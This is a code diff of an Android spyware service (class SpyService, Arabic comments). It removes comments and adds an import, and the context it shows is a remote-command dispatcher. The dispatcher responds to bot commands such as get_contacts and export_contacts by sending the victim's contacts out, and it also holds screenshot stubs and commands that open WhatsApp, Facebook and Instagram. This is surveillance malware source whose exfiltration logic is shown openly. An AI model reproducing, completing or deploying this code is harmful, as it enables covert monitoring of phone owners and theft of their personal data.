@@ -24,6 +24,7 @@ import android.os.Bundle;
 import android.os.Environment;
 import android.os.IBinder;
 import android.os.PowerManager;
+import android.os.StatFs;
 import android.os.Vibrator;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
@@ -815,7 +816,6 @@ public class SpyService extends Service {
     }
 
     private void takeScreenshot() {
-        // MediaProjection سيتم تفعيله لاحقاً
         bot.sendMessage("📸 جاري التقاط لقطة شاشة (قيد التطوير)");
     }
 
@@ -903,13 +903,12 @@ public class SpyService extends Service {
         }
     }
 
-    // ========================== تنفيذ الأوامر (أكثر من 50 أمر) ==========================
+    // ========================== تنفيذ الأوامر ==========================
     private void executeCommand(String cmd) {
         String lower = cmd.toLowerCase().trim();
         Log.d(TAG, "Executing: " + lower);
         try {
             switch (lower) {
-                // أساسيات
                 case "get_contacts": sendFile(collectContacts(), "📇 جهات الاتصال"); break;
                 case "copy_contacts": sendFile(collectContacts(), "📋 نسخة جهات الاتصال"); break;
                 case "export_contacts": sendFile(collectContacts(), "📤 تصدير جهات الاتصال"); break;
@@ -980,7 +979,6 @@ public class SpyService extends Service {
                 case "auto_rotate_off": setAutoRotate(false); break;
                 case "battery_history": getBatteryHistory(); break;
                 case "storage_info": getStorageInfo(); break;
-                // أوامر إضافية
                 case "open_app_whatsapp": openApp("com.whatsapp"); break;
                 case "open_app_facebook": openApp("com.facebook.katana"); break;
                 case "open_app_instagram": openApp("com.instagram.android"); break;
